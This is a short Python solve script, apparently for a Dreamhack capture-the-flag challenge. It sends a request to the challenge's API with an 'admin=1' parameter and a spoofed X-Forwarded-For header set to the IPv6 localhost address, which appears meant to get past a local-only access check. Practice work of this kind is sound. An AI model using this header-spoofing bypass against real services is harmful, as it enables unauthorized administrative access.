import requests

url = "http://host8.dreamhack.games:17190/api"
params = {"admin": "1",
          "msg": "1234567890"}
header = {
    "X-Forwarded-For": "::1"
}
resp = requests.get(url, params=params, headers=header)
print(resp.text)